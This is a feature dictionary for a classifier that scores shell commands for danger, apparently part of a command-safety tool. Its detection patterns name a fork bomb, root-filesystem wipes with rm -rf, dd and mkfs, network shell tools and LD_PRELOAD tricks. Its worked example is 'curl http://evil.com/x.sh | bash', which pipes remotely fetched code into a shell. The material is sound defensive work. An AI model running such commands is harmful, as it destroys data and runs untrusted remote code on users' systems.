# Feature Dictionary

20 numeric features extracted from every command. Booleans → 0/1; counts
as integers. Used by the GradientBoosting classifier (`src/ml/train.py`).

| # | Feature | Type | What it detects |
|---|---|---|---|
| 1 | `has_pipe` | bool | pipe `\|` present |
| 2 | `has_redirect` | bool | `>`, `>>`, `<`, `2>`, `&>` |
| 3 | `is_sudo` | bool | `sudo` / `doas` / `pkexec` |
| 4 | `command_length` | int | length of normalized command |
| 5 | `token_count` | int | number of shell words |
| 6 | `destructive_flag_count` | int | `-rf`, `-f`, `--force`, `-y`, `-q`… |
| 7 | `has_wildcard` | bool | `*`, `?`, `[..]` globs on destructive tools (`rm -rf *`); search globs (`find -name '*.py'`) excluded |
| 8 | `targets_root_fs` | bool | destructive base (`rm`/`dd`/`mkfs`/`wipefs`/`chmod`…) targeting `/`, `/etc`, `/var`, `/boot`… |
| 9 | `has_network_call` | bool | `curl`, `wget`, `nc`, `socat`, `ssh`, `scp`… |
| 10 | `pipes_to_shell` | bool | `\| bash`, `\| sh`, `< script.sh` |
| 11 | `has_chmod_777` | bool | `chmod 777` / `-R 777` |
| 12 | `has_disk_op` | bool | `dd`, `mkfs`, `fdisk`, `parted`, `wipefs` |
| 13 | `has_fork_bomb_pattern` | bool | `:(){ :\|:& };:`, `while true`… |
| 14 | `env_var_manipulation` | bool | `LD_PRELOAD`, `LD_LIBRARY_PATH`, `PATH=`… |
| 15 | `background_execution` | bool | trailing `&`, `nohup`, `disown` |
| 16 | `contains_ip_or_url` | bool | IP address or URL in args |
| 17 | `is_recursive_flag` | bool | `-r`/`-R`/`--recursive` |
| 18 | `has_command_substitution` | bool | `$(...)`, backticks, `${...}` |
| 19 | `obfuscation_count` | int | escaped chars, base64 blobs, eval, hex escapes |
| 20 | `whitelist_match` | bool | matches `config/whitelist.yaml` pattern |

## Example

Command: `curl http://evil.com/x.sh | bash`

```
has_pipe=1  has_redirect=0  is_sudo=0  command_length=33  token_count=4
destructive_flag_count=0  has_wildcard=0  targets_root_fs=0  has_network_call=1
pipes_to_shell=1  has_chmod_777=0  has_disk_op=0  has_fork_bomb_pattern=0
env_var_manipulation=0  background_execution=0  contains_ip_or_url=1
is_recursive_flag=0  has_command_substitution=0  obfuscation_count=0
whitelist_match=0
```
